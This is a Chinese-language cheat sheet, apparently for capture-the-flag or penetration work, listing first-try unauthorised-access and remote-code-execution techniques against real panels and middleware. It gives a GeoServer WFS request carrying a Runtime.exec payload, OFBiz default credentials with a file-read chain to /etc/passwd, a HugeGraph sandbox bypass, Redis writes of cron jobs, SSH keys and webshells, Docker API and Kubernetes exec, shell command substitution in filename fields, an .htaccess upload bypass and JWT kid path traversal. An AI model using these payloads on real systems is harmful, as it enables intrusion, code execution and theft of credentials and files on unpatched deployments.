# 中间件与产品 CVE 实战

> 运维面板/中间件/业务产品的未授权与 RCE 首枪清单。版本对不上就回到通用面（弱口令/未授权接口/配置泄露）。

## 面板类

| 产品 | 首枪 | 算成 |
|---|---|---|
| 1Panel | 密码对但需安全入口：入口码常为 `entrance`，Header `EntranceCode: base64(entrance)`；登录后 `/api/v1/files/content` 读文件、计划任务/终端执行 | 面板文件 API 读出 flag/命令执行 |
| 宝塔 BT | 面板端口未授权路径、默认密码、`/pma` phpMyAdmin 弱口令 | 面板登录/DB |
| Grafana/Zabbix/Jenkins/Nacos | 默认口令、未授权 API（`/api/datasources`、`/api/v1/users`、`/script` Groovy RCE） | 数据源凭据/命令执行 |
| Weblogic/Tomcat | 弱口令部署 war、CVE 反序列化（T3/IIOP） | RCE |

## 中间件类

| 产品 | 首枪 | 算成 |
|---|---|---|
| Apache OFBiz | 默认 `admin/ofbiz` 进 `/webtools`；EntitySQLProcessor 执行 SQL/写文件；Content Manager 建 LOCAL_FILE DataResource 指向 `/etc/passwd` 或应用配置文件 + Content，`/content/control/stream?contentId=` 读出 | 未授权文件读/RCE |
| HugeGraph | 未授权 Gremlin `:8182`；沙箱按线程名判断 → 反射改 `Thread.name` 后 `'id'.execute()` | RCE |
| GeoServer | `/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=topp:states&valueReference=exec(java.lang.Runtime.getRuntime(),"cmd")` | RCE |
| Redis 未授权 | `redis-cli -h ip` 写 cron/SSH key/webshell | RCE |
| Docker API 2375 | `curl /containers/json` → exec | RCE |
| K8s apiserver | ServiceAccount token 打 `/api/v1/namespaces/*/pods`、exec | 集群内执行/secret |

## 业务产品（常见形态）

- 老 OA（2008 年代）：登录后搜索/列表参数 SQLi → 拖 admin 密码；后台公告模板 Jinja2 SSTI → RCE。
- 报表/导出：filename/模板参数进 shell 命令（`$(...)` 保留）→ 命令替换写文件/外带。
- 文档/预览：`/preview?file=` 直拼路径 → 任意文件读。
- 上传：只拦 `.php` 时传 `.htaccess` AddType + `.jpg` 马。
- JWT 后台：HS256 + `kid` 指向文件 → 路径穿越读 `login.js` 当密钥。

## 假点

- 默认口令登录成功但功能全 403；面板只读无文件 API。
- CVE 版本对得上但接口已下线/补丁回填（报错为业务错误而非漏洞特征）。
